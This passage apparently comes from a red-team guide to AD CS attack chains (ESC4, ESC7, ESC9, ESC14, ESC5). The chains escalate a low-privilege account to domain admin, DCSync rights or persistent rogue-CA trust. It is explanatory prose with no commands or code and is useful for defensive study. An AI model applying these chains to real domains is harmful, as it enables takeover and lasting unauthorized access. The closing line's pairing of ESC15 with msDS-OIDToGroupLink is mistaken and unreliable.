**BloodHound path → ESC4 → ESC1 → DA**: BloodHound identifies `GenericWrite` on a template from a low-privilege user. Attacker modifies the template to introduce ESC1 conditions, enrolls a cert naming DA, restores the template, and authenticates. End-to-end domain compromise from a single low-priv account with one misconfigured ACE.

**ManageCA (ESC7) → ESC6 → All templates exploitable**: Attacker with `ManageCA` enables `EDITF_ATTRIBUTESUBJECTALTNAME2`, making every auth-EKU template on the CA an ESC1 equivalent. More impactful than ESC4 because it does not require finding a specific template with write access; any enrollable template becomes the vector.

**ESC4/ESC7 → ESC1 → ESC9 bypass**: In environments with KB5014754 enforcement, the standard ESC1 chain (enrollee-supplied SAN) may still work if the CA embeds `szOID_NTDS_CA_SECURITY_EXT` with the correct SID. But it may not, depending on the template. Using ESC4 to introduce `CT_FLAG_NO_SECURITY_EXTENSION` alongside `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` creates an ESC1 condition that also bypasses strong mapping, though this requires enforcement mode to be less than `2` for the authentication to succeed.

**GenericWrite on account → ESC14 → Account takeover → DCSync**: Write access to an account object enables ESC14. The account obtained via ESC14 is a stepping stone whose value depends on its group memberships, ACL rights, and what further paths it opens. Chaining ESC14 into a group with `DS-Replication-Get-Changes-All` (DCSync rights) is the clearest path to full domain compromise.

**ESC5 (NTAuthCertificates write) → Golden Certificate → Persistent DA**: The highest-persistence chain. Adds a rogue CA to `NTAuthCertificates` and retains the rogue CA private key. Domain password resets, CA re-deployments, and account changes do not invalidate the rogue trust anchor. Persistence survives until `NTAuthCertificates` is audited and the rogue entry removed.

---

*Next: ESC11 (MS-ICPR relay), ESC13 (OID group link abuse), ESC15 (msDS-OIDToGroupLink)*
